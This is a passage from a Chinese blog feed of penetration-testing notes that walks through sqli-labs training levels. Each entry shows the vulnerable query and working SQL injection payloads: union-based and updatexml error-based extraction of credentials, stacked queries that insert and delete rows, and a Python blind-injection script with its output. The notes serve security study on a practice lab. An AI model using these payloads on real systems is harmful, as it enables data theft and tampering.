+</del>123456</p></blockquote><p>密码修改成功 <a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code></p><p><code>?id=1') or 1=('1</code>闭合<br>闭合方式是单引号加括号**’)**</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">') order by 4--+ ?id=1'</span><span class="token punctuation">)</span> order by <span class="token number">3</span>--+ 找回显点?id<span class="token operator">=</span>-1<span class="token string">') union select 1,2,3--+  爆破数据库名称?id=-1'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1<span class="token string">') union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+爆破字段名称?id=-1'</span><span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1'<span class="token punctuation">)</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less39</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less39/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/less39/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>注入方式为<strong>数字型注入</strong>，依旧存在<strong>堆叠注入</strong>  。</p><p><a name="s6XR3"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>利用堆叠注入,<strong>删除</strong>上一关卡我们增添的数据&amp;#x20;<br><code>?id=1;**delete** from users where username='duidie'--+</code></p><p>查询看是否存在 发现’duidie’这条数据的账户和密码都没有了 &amp;#x20;<br><code>?id=-1 union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456</p></blockquote><p><a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’ LIMIT 0,1’ at line 1</p></blockquote><p>数字型注入。</p><p><a name="PF74E"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">4</span>--+ ?id<span class="token operator">=</span><span class="token number">1</span> order by <span class="token number">3</span>--+找回显点?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,3--+  爆破数据库名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破字段名称?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1 union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less46</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less46/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'sort'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM users ORDER BY <span class="token variable">$id</span>"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><blockquote><p>Please input parameter as SORT with numeric value<br>请将参数输入为SORT，并输入数值</p></blockquote><p><a name="l0NTO"></a></p><h1 id="注入点检查"><a href="#注入点检查" class="headerlink" title="注入点检查"></a>注入点检查</h1><p><code>?sort=1</code></p><table><thead><tr><th>ID</th><th>USERNAME</th><th>PASSWORD</th></tr></thead><tbody><tr><td>1</td><td>Dumb</td><td>Dumb</td></tr><tr><td>2</td><td>Angelina</td><td>I-kill-you</td></tr><tr><td>3</td><td>Dummy</td><td>p@ssword</td></tr><tr><td>4</td><td>secure</td><td>crappy</td></tr><tr><td>5</td><td>stupid</td><td>stupidity</td></tr><tr><td>6</td><td>superman</td><td>genious</td></tr><tr><td>7</td><td>batman</td><td>mob!le</td></tr><tr><td>8</td><td>admin</td><td>1234</td></tr><tr><td>9</td><td>admin1</td><td>admin1</td></tr><tr><td>10</td><td>admin2</td><td>admin2</td></tr><tr><td>11</td><td>admin3</td><td>admin3</td></tr><tr><td>12</td><td>dhakkan</td><td>dumbo</td></tr><tr><td>14</td><td>admin4</td><td>admin4</td></tr><tr><td>15</td><td>admin’– +</td><td>123456</td></tr></tbody></table><p><code>?sort=2</code><br>可看出传入的参数。类似于ordey by 按列排序的作用 &amp;#x20;<br><code>?sort=4</code></p><blockquote><p>Unknown column ‘4’ in ‘order clause’</p></blockquote><p><a name="gX6OV"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">查询数据库表?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破数据表?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段名?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +爆破字段?sort<span class="token operator">=</span><span class="token number">1</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span> limit <span class="token number">0,1</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less38</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/stacked-lnjections/less38/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span>/* execute multi query */<span class="token keyword">if</span> <span class="token punctuation">(</span>mysqli_multi_query<span class="token punctuation">(</span><span class="token variable">$con1</span>, <span class="token variable">$sql</span><span class="token punctuation">))</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>** mysqli_multi_query()<strong>这个函数可以实现针对数据库一条或多多条数据的操作<br>这就导致可能产生</strong>堆叠注入<strong>的存在，<br>堆叠注入可以实现</strong>数据的增删改查**，木马的写入，甚至直接破坏,升格数据库 <a name="cmHrI"></a></p><h1 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h1><p>插入一条数据在users字段中,两条不同sql语句用 分号隔开 <strong>；</strong>&amp;#x20;<br><code>?id=1'**;** insert into users(username,password)values('duidie','duidiezhuru')--+</code> &amp;#x20;<br>&amp;#x20;数据插入后页面没有回显，通过查询查看<br><code>id=-1' union select 1,2,(select group_concat(username,0x7e,password)from users)--+</code></p><blockquote><p>Your Username is : 2<br>Your Password is : Dumb<del>Dumb,Angelina</del>I-kill-you,Dummy<del>p@ssword,secure</del>crappy,stupid<del>stupidity,superman</del>genious,batman<del>mob!le,admin</del>1234,admin1<del>admin1,admin2</del>admin2,admin3<del>admin3,dhakkan</del>dumbo,admin4<del>admin4,admin’– +</del>123456,duidie~duidiezhuru</p></blockquote><p>添加数据成功 <a name="bzYh1"></a></p><h1 id="注入点测试"><a href="#注入点测试" class="headerlink" title="注入点测试"></a>注入点测试</h1><p><code>?id=1'</code></p><blockquote><p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ‘’1’’ LIMIT 0,1’ at line 1</p></blockquote><p>单引号’闭合 <a name="PF74E"></a></p><h1 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">判断字段数 ?id<span class="token operator">=</span><span class="token number">1</span><span class="token string">' order by 4--+ ?id=1'</span> order by <span class="token number">3</span>--+找回显点?id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,3--+  爆破数据库名称?id=-1'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,database<span class="token punctuation">(</span><span class="token punctuation">)</span>--+爆破数据库表名称?id<span class="token operator">=</span>-1<span class="token string">' union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()--+爆破字段名称?id=-1'</span> union <span class="token keyword">select</span> <span class="token number">1,2</span>,group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'users'</span>--+爆破字段内容?id<span class="token operator">=</span>-1' union <span class="token keyword">select</span> <span class="token number">1,2</span>,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>username,0x7e,password<span class="token punctuation">)</span> from <span class="token function">users</span><span class="token punctuation">)</span>--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less63</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/less63/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less62/less63/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id='<span class="token variable">$id</span>' LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式为字符型，单引号闭合，<br>需要使用盲注逐个猜解，SQLmap在130次内可能难以获得通关密码，<br>最好用轻量级的脚本获取</p><p><code>?id=1' and 1=2--+</code><br><code>?id=1' and 1=1--+</code></p><p>python脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/usr/bin/python3</span><span class="token comment"># -*-coding:utf-8-*-</span><span class="token function">import</span> re<span class="token function">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://192.168.31.193/Less-63/?id=1"</span>  <span class="token comment"># 改成你的地址</span>try_count <span class="token operator">=</span> <span class="token number">0</span>def extract_bits<span class="token punctuation">(</span>query, i, bit_values: list<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query执行结果的第 i 个（从1开始算）字符的3个比特    哪3个比特由bit_values指定    <span class="token string">""</span>"    global try_count    assert len<span class="token punctuation">(</span>bit_values<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">8</span>    bit_marks <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">v</span> <span class="token keyword">in</span> bit_values:        bit_marks <span class="token operator">|</span><span class="token operator">=</span> <span class="token function">v</span>    payload <span class="token operator">=</span> <span class="token string">""</span>"    <span class="token string">'+(SELECT CASE ASCII(SUBSTRING(({query}), {i}, 1)) &amp; ({bit_mark})    WHEN {0} THEN 1    WHEN {1} THEN 2    WHEN {2} THEN 3    WHEN {3} THEN 4    WHEN {4} THEN 5    WHEN {5} THEN 6    WHEN {6} THEN 7    ELSE 8END)+'</span>    <span class="token string">""</span>".format<span class="token punctuation">(</span>*bit_values<span class="token punctuation">[</span>:7<span class="token punctuation">]</span>, <span class="token assign-left variable">query</span><span class="token operator">=</span>query, <span class="token assign-left variable">bit_mark</span><span class="token operator">=</span>bit_marks, <span class="token assign-left variable">i</span><span class="token operator">=</span>i<span class="token punctuation">)</span>    payload <span class="token operator">=</span> re.sub<span class="token punctuation">(</span>r<span class="token string">'\s+'</span>, <span class="token string">' '</span>, payload.strip<span class="token punctuation">(</span><span class="token punctuation">)</span>.replace<span class="token punctuation">(</span><span class="token string">"<span class="token entity" title="\n">\n</span>"</span>, <span class="token string">" "</span><span class="token punctuation">))</span>    <span class="token comment"># print(payload)</span>    resp <span class="token operator">=</span> requests.get<span class="token punctuation">(</span>url, <span class="token assign-left variable">params</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"id"</span><span class="token builtin class-name">:</span> payload<span class="token punctuation">}</span><span class="token punctuation">)</span>    try_count <span class="token operator">+=</span> <span class="token number">1</span>    infos <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Angelina"</span>, <span class="token string">"Dummy"</span>, <span class="token string">"secure"</span>, <span class="token string">"stupid"</span>, <span class="token string">"superman"</span>, <span class="token string">"batman"</span>, <span class="token string">"admin"</span>, <span class="token string">"admin1"</span><span class="token punctuation">]</span>    match <span class="token operator">=</span> re.search<span class="token punctuation">(</span>r<span class="token string">"Your Login name : (.*?)&lt;br&gt;"</span>, resp.text<span class="token punctuation">)</span>    assert match    assert match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">in</span> infos    bits <span class="token operator">=</span> bit_values<span class="token punctuation">[</span>infos.index<span class="token punctuation">(</span>match.group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">))</span><span class="token punctuation">]</span>    <span class="token builtin class-name">return</span> bitsdef extract_data<span class="token punctuation">(</span>query, length<span class="token punctuation">)</span>:    <span class="token string">""</span>"    获取query查询结果的length个字符，每个字符只获取其第7位和前5位    <span class="token string">""</span>"    res <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span>, length+1<span class="token punctuation">)</span>:        b2 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00000001, 0b00000010, 0b00000011, 0b00000100, 0b00000101, 0b00000110, 0b00000111<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 00000111</span>        b1 <span class="token operator">=</span> extract_bits<span class="token punctuation">(</span>query, i, <span class="token punctuation">[</span>0b00000000, 0b00001000, 0b00010000, 0b00011000, 0b01000000, 0b01001000, 0b01010000, 0b01011000<span class="token punctuation">]</span><span class="token punctuation">)</span>  <span class="token comment"># 01011000</span>        <span class="token keyword">if</span> b1 <span class="token operator">&amp;</span> 0b01000000 <span class="token operator">==</span> <span class="token number">0</span>:            <span class="token comment"># 该字符为数字</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2 <span class="token operator">|</span> 0b00100000        else:            <span class="token comment"># 该字符为字母</span>            bit <span class="token operator">=</span> b1 <span class="token operator">|</span> b2        res <span class="token operator">+=</span> chr<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>    <span class="token builtin class-name">return</span> res<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token builtin class-name">:</span>    table_name <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select table_name from information_schema.TABLES where TABLE_SCHEMA='challenges' limit 1"</span>, <span class="token number">10</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"table_name:"</span>, table_name<span class="token punctuation">)</span>    secret_key <span class="token operator">=</span> extract_data<span class="token punctuation">(</span><span class="token string">"select c from (select 1 as a, 2 as b, 3 as c, 4 as d union select * from challenges.%s limit 1,1)x"</span> % table_name, <span class="token number">24</span><span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"secret_key:"</span>, secret_key<span class="token punctuation">)</span>    print<span class="token punctuation">(</span><span class="token string">"Done. try_count:"</span>, try_count<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿guoyx<span class="token punctuation">)</span>-<span class="token punctuation">[</span>/home/kali<span class="token punctuation">]</span>└─<span class="token comment"># python3 1.py</span>table_name: 50MB3MQNDSsecret_key: NJ3L1WZTKRVPKNLU55LFORLLDone. try_count: <span class="token number">68</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less61</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less61/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less61/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable"><span class="token punctuation">((</span>'$id'<span class="token punctuation">))</span></span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式 ‘))</p><p><code>?id=1')) and 1=1--+</code><br><code>?id=1')) and 1=2--+</code></p><p><a name="OK6A0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1<span class="token string">')) and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +数据表：vo9h7b29b1爆破字段名?id=-1'</span><span class="token punctuation">))</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'vo9h7b29b1'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_T03L获取密码?id<span class="token operator">=</span>-1'<span class="token punctuation">))</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_T03L from vo9h7b29b1<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：zA5wJbBXHvyGPdbQ8phfJBBn<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less60</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less60/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less60/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token string">'("'</span><span class="token builtin class-name">.</span><span class="token variable">$id</span><span class="token builtin class-name">.</span><span class="token string">'")'</span><span class="token punctuation">;</span>// Querry DB to get the correct output<span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>闭合方式”)</p><p><code>?id=1") and 1=1--+</code><br><code>?id=1") and 1=2--+</code></p><p><a name="OK6A0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1<span class="token string">") and updatexml(1,concat(0x7e,(select group_concat(table_name)from information_schema.tables where table_schema=database()),0x7e),1) -- +数据表：kpt3mvazyg爆破字段名?id=-1"</span><span class="token punctuation">)</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'kpt3mvazyg'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_NRFF获取密码?id<span class="token operator">=</span>-1"<span class="token punctuation">)</span> and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_NRFF from kpt3mvazyg<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：vI7A4DnWuwDoNK8NMXKQyYHm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less59</title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less59/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/10sql-zhu-ru-shen-tou-yu-gong-fang/sqli-labs-ba-chang/challenges/less58/less59/</url>
      
        <content type="html"><![CDATA[<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string">"SELECT * FROM security.users WHERE id=<span class="token variable">$id</span> LIMIT 0,1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>闭合方式数字型</p><p><code>?id=1 and 1=1--+</code><br><code>?id=1 and 1=2--+</code> <a name="OK6A0"></a></p><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">爆破数据表?id<span class="token operator">=</span>-1 and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span>from information_schema.tables where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">))</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +数据表：codgf1m6wa爆破字段名?id<span class="token operator">=</span>-1 and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select  group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span>from information_schema.columns where <span class="token assign-left variable">table_schema</span><span class="token operator">=</span>database<span class="token punctuation">(</span><span class="token punctuation">)</span> and <span class="token assign-left variable">table_name</span><span class="token operator">=</span><span class="token string">'codgf1m6wa'</span><span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +字段：secret_JGAS获取密码?id<span class="token operator">=</span>-1 and updatexml<span class="token punctuation">(</span><span class="token number">1</span>,concat<span class="token punctuation">(</span>0x7e,<span class="token punctuation">(</span>select secret_JGAS from codgf1m6wa<span class="token punctuation">)</span>,0x7e<span class="token punctuation">)</span>,1<span class="token punctuation">)</span> -- +密码：JvKSBvmuHkWi8od1IZnHs94e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>less57</title>
